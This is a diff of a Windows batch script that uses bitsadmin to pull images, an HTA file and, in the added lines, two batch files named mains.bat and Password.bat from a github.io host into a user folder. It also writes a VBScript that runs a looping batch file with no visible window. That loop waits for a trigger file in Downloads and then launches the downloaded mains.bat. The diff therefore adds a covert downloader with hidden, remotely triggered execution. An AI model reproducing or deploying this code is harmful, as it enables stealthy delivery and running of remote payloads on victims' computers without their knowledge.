@@ -25,13 +25,15 @@ bitsadmin.exe /transfer "8" https://athdot.github.io/dwnld/8.png %USERPROFILE%\D
 bitsadmin.exe /transfer "9" https://athdot.github.io/dwnld/9.gif %USERPROFILE%\Documents\MASTERFOLDER\mor.gif
 
 bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/10.jpg %USERPROFILE%\Documents\MASTERFOLDER\trippymeme.jpg
+bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/mains.bat %USERPROFILE%\Documents\MASTERFOLDER\mains.bat
+bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/Password.bat %USERPROFILE%\Documents\MASTERFOLDER\Password.bat
 bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/htl.hta %USERPROFILE%\Documents\MASTERFOLDER\Start.hta
 @echo Set shell = WScript.CreateObject("Wscript.Shell")> invisible.vbs
 @echo shell.Run("C:\Users\%USERNAME%\Documents\invisible.bat"),0,true>> invisible.vbs
 @echo @echo off> invisible.bat
 @echo :start>> invisible.bat
 @echo IF EXIST %USERPROFILE%\Downloads\activate.txt (>> invisible.bat
-@echo start %USERPROFILE%\Documents\MASTERFOLDER\Start.hta>> invisible.bat
+@echo start %USERPROFILE%\Documents\MASTERFOLDER\mains.bat>> invisible.bat
 @echo goto :check>> invisible.bat
 @echo ) ELSE (>> invisible.bat
 @echo goto :start>> invisible.bat
